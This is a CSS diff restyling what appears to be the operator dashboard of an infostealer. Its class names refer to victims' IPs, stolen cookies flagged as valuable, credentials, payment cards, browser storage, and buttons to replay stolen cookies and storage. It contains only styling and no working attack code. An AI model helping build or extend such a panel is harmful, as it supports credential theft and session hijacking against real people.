@@ -201,6 +201,25 @@
             text-align: center;
         }
 
+        .sidebar .nav-item.storage-nav { color: #8b5cf6; }
+        .sidebar .nav-item.storage-nav:hover { color: #a78bfa; background: #1a0a2a; }
+        .sidebar .nav-item.storage-nav.active { color: #8b5cf6; border-left-color: #8b5cf6; }
+        .sidebar .nav-item.storage-nav .badge {
+            margin-left: auto;
+            background: #8b5cf6;
+            color: #0b0f1a;
+            font-size: 9px;
+            padding: 0 6px;
+            border-radius: 8px;
+            font-weight: 700;
+            min-width: 18px;
+            text-align: center;
+        }
+
+        .sidebar .nav-item.replay-nav { color: #f472b6; }
+        .sidebar .nav-item.replay-nav:hover { color: #f9a8d4; background: #1a0a1a; }
+        .sidebar .nav-item.replay-nav.active { color: #f472b6; border-left-color: #f472b6; }
+
         .sidebar-toggle {
             display: none;
             position: fixed;
@@ -387,6 +406,7 @@
         .stat-card .number.blue { color: #3b82f6; }
         .stat-card .number.pink { color: #ec4899; }
         .stat-card .number.cyan { color: #06b6d4; }
+        .stat-card .number.violet { color: #8b5cf6; }
         .stat-card .sub { font-size: 10px; color: #334155; margin-top: 2px; }
 
         .toolbar {
@@ -422,6 +442,11 @@
         .btn.danger:hover { background: rgba(255,68,68,0.08); box-shadow: 0 0 20px rgba(255,68,68,0.1); }
         .btn.warning { border-color: #f59e0b; color: #f59e0b; }
         .btn.warning:hover { background: rgba(245,158,11,0.08); box-shadow: 0 0 20px rgba(245,158,11,0.1); }
+        .btn.violet { border-color: #8b5cf6; color: #8b5cf6; }
+        .btn.violet:hover { background: rgba(139,92,246,0.08); box-shadow: 0 0 20px rgba(139,92,246,0.1); }
+        .btn.replay-pink { border-color: #f472b6; color: #f472b6; }
+        .btn.replay-pink:hover { background: rgba(244,114,182,0.08); box-shadow: 0 0 20px rgba(244,114,182,0.1); }
+
         .btn-icon-sm {
             background: transparent;
             border: 1px solid #1a2538;
@@ -445,135 +470,158 @@
         .btn-icon-sm.delete-sm:hover { background: rgba(255,68,68,0.15); }
         .btn-icon-sm.txt { border-color: #8b5cf6; color: #8b5cf6; }
         .btn-icon-sm.txt:hover { background: rgba(139,92,246,0.08); }
+        .btn-icon-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
+        .btn-icon-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
+        .btn-icon-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
+        .btn-icon-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
+        .btn-icon-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
+        .btn-icon-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
 
-        .domain-grid {
+        /* PC CARD — MAIN */
+        .pc-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 12px;
+            grid-template-columns: 1fr;
+            gap: 16px;
         }
-        .domain-card {
+        .pc-card {
             background: #0f1626;
             border: 1px solid #1a2538;
-            border-radius: 10px;
-            padding: 14px 16px;
+            border-radius: 12px;
+            padding: 16px 18px;
             transition: all 0.3s ease;
-            cursor: pointer;
             position: relative;
             overflow: hidden;
         }
-        .domain-card:hover { border-color: #2a3a5a; transform: translateY(-3px); box-shadow: 0 8px 40px rgba(0,0,0,0.4); }
-        .domain-card .header {
+        .pc-card:hover { border-color: #2a3a5a; box-shadow: 0 8px 40px rgba(0,0,0,0.4); }
+
+        .pc-card .pc-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            gap: 6px;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 6px;
         }
-        .domain-card .header .domain { font-size: 14px; font-weight: 600; color: #f1f5f9; word-break: break-all; }
-        .domain-card .header .badge-valuable {
-            font-size: 7px;
-            background: linear-gradient(135deg, #ff4444, #cc3333);
-            color: #fff;
-            padding: 1px 8px;
-            border-radius: 10px;
-            text-transform: uppercase;
+        .pc-card .pc-header .pc-name {
+            font-size: 16px;
             font-weight: 700;
-            box-shadow: 0 0 12px rgba(255,68,68,0.15);
-            white-space: nowrap;
-        }
-        .domain-card .header .badge-cred {
-            font-size: 7px;
-            background: linear-gradient(135deg, #ec4899, #db2777);
-            color: #fff;
-            padding: 1px 8px;
-            border-radius: 10px;
-            text-transform: uppercase;
-            font-weight: 700;
-            box-shadow: 0 0 12px rgba(236,72,153,0.15);
-            white-space: nowrap;
-        }
-        .domain-card .header .badge-card {
-            font-size: 7px;
-            background: linear-gradient(135deg, #06b6d4, #0891b2);
-            color: #fff;
-            padding: 1px 8px;
-            border-radius: 10px;
-            text-transform: uppercase;
-            font-weight: 700;
-            box-shadow: 0 0 12px rgba(6,182,212,0.15);
-            white-space: nowrap;
-        }
-        .domain-card .stats {
+            color: #f1f5f9;
             display: flex;
-            gap: 12px;
-            margin: 6px 0 4px;
+            align-items: center;
+            gap: 8px;
+        }
+        .pc-card .pc-header .pc-name .icon { font-size: 20px; }
+        .pc-card .pc-header .pc-stats {
             font-size: 11px;
             color: #64748b;
-            flex-wrap: wrap;
-        }
-        .domain-card .stats strong { color: #e2e8f0; }
-        .domain-card .stats .cookies { color: #00ff88; }
-        .domain-card .stats .victims { color: #f59e0b; }
-        .domain-card .stats .creds { color: #ec4899; }
-        .domain-card .stats .cards { color: #06b6d4; }
-
-        .domain-card .victims-list {
-            margin-top: 4px;
             display: flex;
+            gap: 12px;
             flex-wrap: wrap;
-            gap: 3px;
         }
-        .domain-card .victims-list .victim-tag {
-            display: inline-flex;
-            align-items: center;
-            gap: 2px;
-            background: #1a2538;
-            padding: 1px 6px 1px 3px;
-            border-radius: 8px;
-            font-size: 8px;
-            color: #94a3b8;
-            border: 1px solid #1e293b;
-            transition: 0.2s;
-            cursor: pointer;
-        }
-        .domain-card .victims-list .victim-tag:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1e2a3e; }
-        .domain-card .victims-list .victim-tag .flag { font-size: 10px; }
-        .domain-card .victims-list .victim-tag .ip { font-family: monospace; font-size: 8px; }
-        .domain-card .victims-list .victim-tag .time { font-size: 7px; color: #475569; margin-left: 1px; }
-        .domain-card .victims-list .victim-tag .time .ago { color: #00ff88; }
+        .pc-card .pc-header .pc-stats span { display: flex; align-items: center; gap: 3px; }
+        .pc-card .pc-header .pc-stats .cookies { color: #00ff88; }
+        .pc-card .pc-header .pc-stats .creds { color: #ec4899; }
+        .pc-card .pc-header .pc-stats .cards { color: #06b6d4; }
+        .pc-card .pc-header .pc-stats .storage { color: #8b5cf6; }
+        .pc-card .pc-header .pc-stats .victims { color: #f59e0b; }
 
-        .domain-card .meta {
+        .pc-card .pc-meta {
             font-size: 10px;
-            color: #334155;
-            border-top: 1px solid #1a2538;
-            padding-top: 6px;
-            margin-top: 6px;
+            color: #64748b;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #1a2538;
+        }
+        .pc-card .pc-meta .flag { font-size: 14px; }
+        .pc-card .pc-meta .ip { color: #94a3b8; font-family: monospace; }
+        .pc-card .pc-meta .country { color: #94a3b8; }
+
+        .pc-card .domain-list {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 6px;
+        }
+        .pc-card .domain-item {
+            background: #0b0f1a;
+            border: 1px solid #1a2538;
+            border-radius: 6px;
+            padding: 6px 10px;
             display: flex;
             justify-content: space-between;
+            align-items: center;
             flex-wrap: wrap;
-            gap: 4px;
-        }
-        .domain-card .meta .latest-time { color: #64748b; }
-        .domain-card .meta .latest-time .time-text { color: #94a3b8; }
-        .domain-card .meta .delete-domain-btn {
-            color: #ff4444;
-            cursor: pointer;
-            font-size: 9px;
-            padding: 0 4px;
-            border-radius: 3px;
-            border: 1px solid #ff4444;
-            background: transparent;
+            gap: 6px;
             transition: 0.2s;
         }
-        .domain-card .meta .delete-domain-btn:hover { background: rgba(255,68,68,0.15); }
+        .pc-card .domain-item:hover { border-color: #2a3a5a; background: #111827; }
 
-        .domain-card .actions {
-            margin-top: 8px;
+        .pc-card .domain-item .domain-name {
+            color: #00ff88;
+            font-size: 12px;
+            font-weight: 500;
+            word-break: break-all;
+        }
+        .pc-card .domain-item .domain-stats {
+            font-size: 9px;
+            color: #64748b;
             display: flex;
-            gap: 4px;
+            gap: 8px;
             flex-wrap: wrap;
         }
-        .domain-card .actions .btn-sm {
-            padding: 2px 8px;
+        .pc-card .domain-item .domain-stats .cookies { color: #00ff88; }
+        .pc-card .domain-item .domain-stats .creds { color: #ec4899; }
+        .pc-card .domain-item .domain-stats .cards { color: #06b6d4; }
+        .pc-card .domain-item .domain-stats .storage { color: #8b5cf6; }
+        .pc-card .domain-item .domain-actions {
+            display: flex;
+            gap: 3px;
+            flex-wrap: wrap;
+        }
+        .pc-card .domain-item .domain-actions .btn-sm {
+            padding: 1px 6px;
+            font-size: 8px;
+            border-radius: 4px;
+            border: 1px solid #1a2538;
+            background: transparent;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        .pc-card .domain-item .domain-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
+        .pc-card .domain-item .domain-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
+        .pc-card .domain-item .domain-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
+        .pc-card .domain-item .domain-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
+        .pc-card .domain-item .domain-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
+        .pc-card .domain-item .domain-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
+        .pc-card .domain-item .domain-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
+        .pc-card .domain-item .domain-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
+        .pc-card .domain-item .domain-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
+        .pc-card .domain-item .domain-actions .btn-sm.view { border-color: #3b82f6; color: #3b82f6; }
+        .pc-card .domain-item .domain-actions .btn-sm.view:hover { background: rgba(59,130,246,0.08); }
+        .pc-card .domain-item .domain-actions .btn-sm.disabled {
+            opacity: 0.3;
+            cursor: default;
+            border-color: #334155;
+        }
+        .pc-card .domain-item .domain-actions .btn-sm.disabled:hover {
+            background: transparent;
+            transform: none;
+        }
+
+        .pc-card .pc-actions {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #1a2538;
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .pc-card .pc-actions .btn-sm {
+            padding: 2px 10px;
             font-size: 9px;
             border-radius: 4px;
             border: 1px solid #1a2538;
@@ -583,17 +631,13 @@
             transition: all 0.2s ease;
             font-weight: 500;
         }
-        .domain-card .actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
-        .domain-card .actions .btn-sm.replay { border-color: #00ff88; color: #00ff88; }
-        .domain-card .actions .btn-sm.replay:hover { background: rgba(0,255,136,0.08); }
-        .domain-card .actions .btn-sm.test { border-color: #3b82f6; color: #3b82f6; }
-        .domain-card .actions .btn-sm.test:hover { background: rgba(59,130,246,0.08); }
-        .domain-card .actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
-        .domain-card .actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
-        .domain-card .actions .btn-sm.delete { border-color: #ff4444; color: #ff4444; }
-        .domain-card .actions .btn-sm.delete:hover { background: rgba(255,68,68,0.15); }
-        .domain-card .actions .btn-sm.txt { border-color: #8b5cf6; color: #8b5cf6; }
-        .domain-card .actions .btn-sm.txt:hover { background: rgba(139,92,246,0.08); }
+        .pc-card .pc-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
+        .pc-card .pc-actions .btn-sm.danger { border-color: #ff4444; color: #ff4444; }
+        .pc-card .pc-actions .btn-sm.danger:hover { background: rgba(255,68,68,0.15); }
+        .pc-card .pc-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
+        .pc-card .pc-actions .btn-sm.primary:hover { background: rgba(0,255,136,0.08); }
+        .pc-card .pc-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
+        .pc-card .pc-actions .btn-sm.violet:hover { background: rgba(139,92,246,0.08); }
 
         .view-content { display: none; }
         .view-content.active { display: block; }
@@ -624,46 +668,160 @@
         .cookies-table .cookie-name { color: #f59e0b; font-family: monospace; font-size: 10px; }
         .cookies-table .cookie-value { color: #94a3b8; font-family: monospace; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         .cookies-table .cookie-valuable { background: #ff4444; color: #fff; font-size: 6px; padding: 1px 6px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }
+        .cookies-table .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }
 
         .cred-row { border-left: 2px solid #ec4899; }
         .cred-row td { padding: 4px 8px; font-size: 10px; }
         .cred-row .cred-name { color: #ec4899; font-weight: 500; }
         .cred-row .cred-value { color: #f1f5f9; font-family: monospace; }
         .cred-row .cred-type { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
+        .cred-row .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }
 
         .card-row { border-left: 2px solid #06b6d4; }
         .card-row td { padding: 4px 8px; font-size: 10px; }
         .card-row .card-name { color: #06b6d4; font-weight: 500; }
         .card-row .card-value { color: #f1f5f9; font-family: monospace; }
         .card-row .card-type { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
+        .card-row .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }
+
+        .storage-row { border-left: 2px solid #8b5cf6; }
+        .storage-row td { padding: 4px 8px; font-size: 10px; }
+        .storage-row .storage-key { color: #8b5cf6; font-weight: 500; }
+        .storage-row .storage-value { color: #f1f5f9; font-family: monospace; }
+        .storage-row .storage-browser { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
+        .storage-row .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }
+
+        /* REPLAY GRID */
+        .replay-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 16px;
+        }
+        .replay-card {
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            border-radius: 12px;
+            padding: 16px 18px;
+            transition: all 0.3s ease;
+        }
+        .replay-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .replay-card .r-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+            flex-wrap: wrap;
+        }
+        .replay-card .r-header .flag { font-size: 18px; }
+        .replay-card .r-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
+        .replay-card .r-header .pc-name { color: #f472b6; font-weight: 600; font-size: 13px; }
+        .replay-card .r-domain-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin: 6px 0;
+        }
+        .replay-card .r-domain-list .domain-tag {
+            background: #1a2538;
+            padding: 1px 8px;
+            border-radius: 10px;
+            font-size: 9px;
+            color: #94a3b8;
+            border: 1px solid #1e293b;
+        }
+        .replay-card .r-domain-list .domain-tag .count { color: #00ff88; }
+        .replay-card .r-actions {
+            display: flex;
+            gap: 4px;
+            flex-wrap: wrap;
+            padding-top: 6px;
+            border-top: 1px solid #1a2538;
+        }
+        .replay-card .r-actions .btn-sm {
+            padding: 2px 10px;
+            font-size: 9px;
+            border-radius: 4px;
+            border: 1px solid #1a2538;
+            background: transparent;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        .replay-card .r-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
+        .replay-card .r-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
+        .replay-card .r-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
+        .replay-card .r-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
+        .replay-card .r-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
+        .replay-card .r-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
+        .replay-card .r-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
+        .replay-card .r-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
+        .replay-card .r-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
+        .replay-card .r-actions .btn-sm.view { border-color: #3b82f6; color: #3b82f6; }
+        .replay-card .r-actions .btn-sm.view:hover { background: rgba(59,130,246,0.08); }
+        .replay-card .r-actions .btn-sm.disabled {
+            opacity: 0.3;
+            cursor: default;
+            border-color: #334155;
+        }
+        .replay-card .r-actions .btn-sm.disabled:hover {
+            background: transparent;
+            transform: none;
+        }
+        .replay-card .r-stats {
+            font-size: 10px;
+            color: #64748b;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin: 4px 0;
+        }
+        .replay-card .r-stats .cookies { color: #00ff88; }
+        .replay-card .r-stats .storage { color: #8b5cf6; }
+        .replay-card .r-stats .creds { color: #ec4899; }
+        .replay-card .r-stats .cards { color: #06b6d4; }
 
         .victims-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-            gap: 10px;
-            margin-top: 12px;
+            grid-template-columns: 1fr;
+            gap: 16px;
         }
         .victim-card {
             background: #0f1626;
             border: 1px solid #1a2538;
-            border-radius: 8px;
-            padding: 12px 14px;
+            border-radius: 12px;
+            padding: 14px 16px;
             transition: 0.2s;
             cursor: pointer;
             position: relative;
         }
         .victim-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        .victim-card .v-header { display: flex; align-items: center; gap: 6px; margin-bottom: 4px; }
+        .victim-card .v-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; flex-wrap: wrap; }
         .victim-card .v-header .flag { font-size: 18px; }
         .victim-card .v-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
-        .victim-card .v-details { font-size: 10px; color: #64748b; display: flex; flex-wrap: wrap; gap: 6px; }
-        .victim-card .v-details .domain { color: #00ff88; }
+        .victim-card .v-header .pc-name { color: #f472b6; font-weight: 600; font-size: 13px; }
+        .victim-card .v-details { font-size: 10px; color: #64748b; display: flex; flex-wrap: wrap; gap: 8px; }
+        .victim-card .v-details .country { color: #94a3b8; }
         .victim-card .v-details .time { color: #475569; }
-        .victim-card .v-cookies { font-size: 9px; color: #f59e0b; margin-top: 2px; }
+        .victim-card .v-domain-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin: 4px 0;
+        }
+        .victim-card .v-domain-list .domain-tag {
+            background: #1a2538;
+            padding: 1px 8px;
+            border-radius: 10px;
+            font-size: 8px;
+            color: #94a3b8;
+            border: 1px solid #1e293b;
+        }
+        .victim-card .v-domain-list .domain-tag .count { color: #00ff88; }
         .victim-card .v-delete {
             position: absolute;
-            top: 6px;
-            right: 6px;
+            top: 8px;
+            right: 8px;
             background: transparent;
             border: none;
             color: #475569;
@@ -674,6 +832,43 @@
             border-radius: 4px;
         }
         .victim-card .v-delete:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
+        .victim-card .v-actions {
+            display: flex;
+            gap: 4px;
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 1px solid #1a2538;
+            flex-wrap: wrap;
+        }
+        .victim-card .v-actions .btn-sm {
+            padding: 2px 8px;
+            font-size: 8px;
+            border-radius: 4px;
+            border: 1px solid #1a2538;
+            background: transparent;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        .victim-card .v-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
+        .victim-card .v-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
+        .victim-card .v-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
+        .victim-card .v-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
+        .victim-card .v-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
+        .victim-card .v-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
+        .victim-card .v-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
+        .victim-card .v-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
+        .victim-card .v-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
+        .victim-card .v-actions .btn-sm.disabled {
+            opacity: 0.3;
+            cursor: default;
+            border-color: #334155;
+        }
+        .victim-card .v-actions .btn-sm.disabled:hover {
+            background: transparent;
+            transform: none;
+        }
 
         .modal-overlay {
             display: none;
@@ -731,12 +926,13 @@
             gap: 8px;
             margin-bottom: 4px;
             flex-wrap: wrap;
-            padding-right: 120px;
+            padding-right: 140px;
         }
         .modal .victim-entry .victim-header .flag { font-size: 18px; }
         .modal .victim-entry .victim-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
         .modal .victim-entry .victim-header .country { font-size: 11px; color: #94a3b8; }
         .modal .victim-entry .victim-header .city { font-size: 10px; color: #64748b; }
+        .modal .victim-entry .victim-header .pc-label { color: #f472b6; font-size: 11px; font-weight: 600; }
         .modal .victim-entry .victim-header .time-badge {
             margin-left: auto;
             font-size: 9px;
@@ -759,35 +955,26 @@
             display: flex;
             gap: 4px;
             flex-wrap: wrap;
-            max-width: 110px;
+            max-width: 130px;
         }
         .modal .victim-entry .modal-actions .btn-icon-sm {
             padding: 0 6px;
-            font-size: 11px;
-            line-height: 22px;
-            height: 24px;
+            font-size: 10px;
+            line-height: 20px;
+            height: 22px;
         }
-        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm {
-            border-color: #ff4444;
-            color: #ff4444;
-        }
-        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm:hover {
-            background: rgba(255,68,68,0.15);
-        }
-        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm {
-            border-color: #00ff88;
-            color: #00ff88;
-        }
-        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm:hover {
-            background: rgba(0,255,136,0.08);
-        }
-        .modal .victim-entry .modal-actions .btn-icon-sm.txt {
-            border-color: #8b5cf6;
-            color: #8b5cf6;
-        }
-        .modal .victim-entry .modal-actions .btn-icon-sm.txt:hover {
-            background: rgba(139,92,246,0.08);
-        }
+        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm { border-color: #ff4444; color: #ff4444; }
+        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm:hover { background: rgba(255,68,68,0.15); }
+        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm { border-color: #00ff88; color: #00ff88; }
+        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm:hover { background: rgba(0,255,136,0.08); }
+        .modal .victim-entry .modal-actions .btn-icon-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
+        .modal .victim-entry .modal-actions .btn-icon-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
+        .modal .victim-entry .modal-actions .btn-icon-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
+        .modal .victim-entry .modal-actions .btn-icon-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
+        .modal .victim-entry .modal-actions .btn-icon-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
+        .modal .victim-entry .modal-actions .btn-icon-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
+        .modal .victim-entry .modal-actions .btn-icon-sm.txt { border-color: #8b5cf6; color: #8b5cf6; }
+        .modal .victim-entry .modal-actions .btn-icon-sm.txt:hover { background: rgba(139,92,246,0.08); }
 
         .modal .victim-entry .data-section {
             margin-top: 4px;
@@ -810,52 +997,16 @@
             font-size: 10px;
             flex-wrap: wrap;
         }
-        .modal .victim-entry .data-section .data-item .label {
-            color: #94a3b8;
-            min-width: 60px;
-            font-size: 9px;
-        }
-        .modal .victim-entry .data-section .data-item .value {
-            color: #f1f5f9;
-            font-family: monospace;
-            word-break: break-all;
-            flex: 1;
-            min-width: 80px;
-        }
-        .modal .victim-entry .data-section .data-item .value.password-hidden {
-            filter: blur(4px);
-            transition: filter 0.3s;
-        }
+        .modal .victim-entry .data-section .data-item .label { color: #94a3b8; min-width: 60px; font-size: 9px; }
+        .modal .victim-entry .data-section .data-item .value { color: #f1f5f9; font-family: monospace; word-break: break-all; flex: 1; min-width: 80px; }
+        .modal .victim-entry .data-section .data-item .value.password-hidden { filter: blur(4px); transition: filter 0.3s; }
         .modal .victim-entry .data-section .data-item .value.password-hidden:hover { filter: blur(0); }
-        .modal .victim-entry .data-section .data-item .link {
-            color: #00ff88;
-            text-decoration: none;
-            font-size: 9px;
-            word-break: break-all;
-        }
+        .modal .victim-entry .data-section .data-item .link { color: #00ff88; text-decoration: none; font-size: 9px; word-break: break-all; }
         .modal .victim-entry .data-section .data-item .link:hover { text-decoration: underline; color: #66ffaa; }
-        .modal .victim-entry .data-section .data-item .actions {
-            display: flex;
-            gap: 3px;
-            flex-shrink: 0;
-        }
-        .modal .victim-entry .data-section .data-item .badge-type {
-            font-size: 6px;
-            background: #1a2538;
-            padding: 1px 6px;
-            border-radius: 4px;
-            color: #64748b;
-            text-transform: uppercase;
-        }
-        .modal .victim-entry .data-section .data-item .badge-valuable {
-            font-size: 5px;
-            background: linear-gradient(135deg, #ff4444, #cc3333);
-            color: #fff;
-            padding: 1px 4px;
-            border-radius: 6px;
-            text-transform: uppercase;
-            font-weight: 700;
-        }
+        .modal .victim-entry .data-section .data-item .actions { display: flex; gap: 3px; flex-shrink: 0; }
+        .modal .victim-entry .data-section .data-item .badge-type { font-size: 6px; background: #1a2538; padding: 1px 6px; border-radius: 4px; color: #64748b; text-transform: uppercase; }
+        .modal .victim-entry .data-section .data-item .badge-valuable { font-size: 5px; background: linear-gradient(135deg, #ff4444, #cc3333); color: #fff; padding: 1px 4px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }
+        .modal .victim-entry .data-section .data-item .badge-storage { font-size: 5px; background: linear-gradient(135deg, #8b5cf6, #7c3aed); color: #fff; padding: 1px 4px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }
 
         .modal .session-actions {
             margin-top: 14px;
@@ -1024,7 +1175,6 @@
         .powered-footer { text-align: center; font-size: 10px; color: #1e293b; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
         .powered-footer .name { color: #00ff88; font-weight: 600; }
 
-        @media (max-width: 992px) { .domain-grid { grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); } }
         @media (max-width: 768px) {
             .sidebar { position: fixed; top: 0; left: 0; transform: translateX(-260px); width: 260px; height: 100vh; z-index: 150; border-right: 1px solid #1a2538; box-shadow: 4px 0 40px rgba(0,0,0,0.5); }
             .sidebar.open { transform: translateX(0); }
@@ -1033,20 +1183,20 @@
             .main { padding: 14px; padding-top: 54px; }
             .topbar .page-title h2 { font-size: 17px; }
             .stats-row { grid-template-columns: repeat(2, 1fr); }
-            .domain-grid { grid-template-columns: 1fr; }
             .modal { padding: 14px; }
             .settings-modal { padding: 14px; }
             .modal .victim-entry .victim-header .time-badge { margin-left: 0; width: 100%; }
             .settings-modal .btn-group { flex-direction: column; }
             .logout-confirm-box { padding: 20px 16px; }
             .custom-confirm-box { padding: 20px 16px; }
-            .victims-grid { grid-template-columns: 1fr; }
-            .modal .victim-entry .data-section .data-item { flex-wrap: wrap; }
-            .modal .victim-entry .data-section .data-item .label { min-width: 40px; }
-            .modal .victim-entry .data-section .data-item .actions { margin-top: 2px; }
             .modal .victim-entry .victim-header { padding-right: 50px; }
             .modal .victim-entry .modal-actions { top: 4px; right: 4px; max-width: 80px; }
             .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 9px; padding: 0 4px; height: 20px; line-height: 20px; }
+            .pc-card .domain-item { flex-direction: column; align-items: flex-start; }
+            .pc-card .domain-item .domain-actions { margin-top: 4px; width: 100%; justify-content: flex-start; }
+            .pc-card .pc-header .pc-stats { font-size: 10px; gap: 8px; }
+            .victim-card .v-header .pc-name { font-size: 12px; }
+            .replay-card .r-header .pc-name { font-size: 12px; }
         }
         @media (max-width: 480px) {
             .stats-row { grid-template-columns: 1fr; }
@@ -1057,9 +1207,13 @@
             .topbar .right .logout-btn { font-size: 11px; padding: 3px 8px; }
             .topbar .right .user { font-size: 11px; padding: 3px 8px; }
             .topbar .right .live-badge { font-size: 11px; padding: 3px 8px; }
-            .domain-card .header .domain { font-size: 13px; }
-            .domain-card .stats { font-size: 10px; gap: 8px; }
-            .domain-card .victims-list .victim-tag { font-size: 7px; }
+            .pc-card { padding: 12px 14px; }
+            .pc-card .pc-header .pc-name { font-size: 14px; }
+            .pc-card .domain-item { padding: 4px 8px; }
+            .pc-card .domain-item .domain-name { font-size: 11px; }
+            .pc-card .domain-item .domain-stats { font-size: 8px; gap: 4px; }
+            .pc-card .domain-item .domain-actions .btn-sm { font-size: 7px; padding: 1px 4px; }
+            .pc-card .pc-actions .btn-sm { font-size: 8px; padding: 1px 6px; }
             .modal .victim-entry .victim-header .ip { font-size: 11px; }
             .modal .victim-entry .victim-header .flag { font-size: 16px; }
             .modal .victim-entry .data-section .data-item { font-size: 9px; }
@@ -1074,17 +1228,29 @@
             .btn-icon-sm { font-size: 8px; padding: 0 4px; height: 18px; line-height: 18px; }
